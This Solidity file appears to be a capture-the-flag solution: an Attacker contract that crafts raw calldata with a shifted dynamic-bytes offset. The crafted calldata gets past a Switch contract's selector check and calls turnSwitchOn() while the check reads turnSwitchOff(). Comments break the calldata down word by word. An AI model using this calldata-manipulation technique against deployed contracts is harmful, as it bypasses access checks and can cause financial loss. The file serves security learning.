//SPDX-License-Identifier:MIT
pragma solidity ^0.8.16;
import {Switch} from "./Switch.sol";

contract Attacker {
    address private _s;
    bytes4 offSelector = bytes4(keccak256("turnSwitchOff()"));
    bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));

    constructor(address _switch) {
        _s = _switch;
    }

    function attack() public {
        bytes memory callData = showCallData();
        (bool success, ) = _s.call(callData);
        if (!success) {
            revert();
        }
    }

    function turnOff() public {
        bytes memory turnOffData = abi.encodeWithSignature("turnSwitchOff()");
        bytes memory callData = abi.encodeWithSignature(
            "flipSwitch(bytes)",
            turnOffData
        );
        (bool success, ) = _s.call(callData);
        if (!success) {
            revert();
        }
    }

    function showCallData() public view returns (bytes memory) {
        bytes32 offset = bytes32(uint256(32 * 3));
        bytes32 checkdata = bytes32(offSelector);
        bytes32 length = bytes32(uint256(4));
      
        //construct bytes data with bytes32 to skip check
        bytes memory callData = abi.encodeWithSignature(
            "flipSwitch(bytes)",
            offset,
            checkdata,
            checkdata,
            length,
            onSelector
        );
        return callData;
    // calldata explaination 
    // 0x30c13ade                                                           ---signaturn for "flipSwitch(bytes)"
    // 0000000000000000000000000000000000000000000000000000000000000060     ---offset 60 in hex = 32bytes * 3 in decimals
    // 20606e1500000000000000000000000000000000000000000000000000000000     ---extra data
    // 20606e1500000000000000000000000000000000000000000000000000000000     ---check data hard encode for 68
    // 0000000000000000000000000000000000000000000000000000000000000004     ---length for bytes
    // 76227e1200000000000000000000000000000000000000000000000000000000     ---value for bytes
    }

    //Dynamic Types :string, bytes and arrays
    //Static Types:‘uint’s,‘address’,‘bool’,‘bytes’-n,‘tuples’

    


}
